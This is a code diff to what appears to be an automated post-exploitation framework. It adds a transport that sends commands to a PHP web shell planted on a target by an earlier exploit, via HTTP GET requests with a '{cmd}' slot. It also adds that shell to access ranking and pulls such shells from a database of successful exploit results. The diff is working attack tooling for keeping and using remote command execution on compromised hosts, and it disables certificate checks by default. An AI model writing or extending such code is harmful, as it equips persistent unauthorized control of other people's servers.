@@ -163,11 +163,38 @@ def _run_listener_callback(handle: str, command: str, **_) -> str:
     return (r.json() or {}).get("output") or ""
 
 
+def _run_webshell(handle: str, command: str, **_) -> str:
+    """A web shell an exploit planted — the invocation URL carries a `{cmd}` slot.
+
+    Not a session and not a socket: each command is one HTTP GET that runs
+    through the PHP shell dropped on the target and returns its stdout as the
+    body. Stateless (a fresh process per request, like a piped bind shell), but
+    it is real held access and survives as long as the file is on disk — which
+    is why it belongs in obtained_access, ranked next to bind/ssh/msf. Mirrors
+    the invocation exploit-runner already uses for post-ex (`{cmd}` → url-quoted).
+    """
+    import urllib.parse
+    import requests
+    if "{cmd}" not in handle:
+        raise ValueError(f"webshell handle {handle!r} has no {{cmd}} slot")
+    url = handle.replace("{cmd}", urllib.parse.quote(command))
+    r = requests.get(url, timeout=PROBE_TIMEOUT,
+                     verify=os.environ.get("REQUESTS_CA_BUNDLE", False))
+    # A 5xx is the server erroring, not the shell answering — same reasoning as
+    # the bind/ssh transports treating stderr-only as "not an answer". Raise so
+    # the probe records a failure, never an empty "it replied".
+    if r.status_code >= 500:
+        raise ConnectionError(
+            f"webshell {handle.split('?')[0]} returned HTTP {r.status_code}")
+    return r.text or ""
+
+
 TRANSPORTS: Dict[str, Callable[..., str]] = {
     "msf_session": _run_msf,
     "bind_shell": _run_bind_shell,
     "ssh_credential": _run_ssh_credential,
     "listener_callback": _run_listener_callback,
+    "webshell": _run_webshell,
 }
 
 
@@ -275,7 +302,7 @@ def score_for(is_root: Optional[bool], probes: int, probes_ok: int,
     # starts fresh each time. A small preference, never enough to outrank
     # privilege.
     bonus = {"msf_session": 5, "listener_callback": 4,
-             "ssh_credential": 3, "bind_shell": 0}.get(kind, 0)
+             "ssh_credential": 3, "webshell": 1, "bind_shell": 0}.get(kind, 0)
     return int(base * reliability) + bonus
 
 
@@ -391,6 +418,27 @@ def discover(target: str, *, cur=None) -> List[Dict[str, Any]]:
                               "transport": "ssh"})
         except Exception as e:  # noqa: BLE001
             log.debug("credential discovery failed: %s", e)
+
+        # 4. Web shells: a PHP shell an exploit planted, addressable by a URL
+        #    with a {cmd} slot (exploit-runner records it as session_id on a
+        #    successful webshell result). Proven RCE that was NOT held access
+        #    before this transport existed — sourcing it here makes a planted
+        #    web shell durable and rankable alongside bind/ssh/msf.
+        try:
+            cur.execute(
+                """SELECT pe.target_ip, pe.target_port, er.session_id
+                     FROM exploit_results er
+                     JOIN pending_exploits pe ON pe.id = er.pending_exploit_id
+                    WHERE er.session_type = 'webshell' AND er.success = true
+                      AND er.session_id IS NOT NULL AND pe.target_ip = %s
+                    ORDER BY er.created_at DESC LIMIT 3""", (target,))
+            for _tip, tport, url in cur.fetchall():
+                found.append({"target": target, "port": tport or 80,
+                              "kind": "webshell",
+                              "handle": url,
+                              "transport": "http"})
+        except Exception as e:  # noqa: BLE001
+            log.debug("webshell discovery failed: %s", e)
     finally:
         if own and conn is not None:
             conn.close()
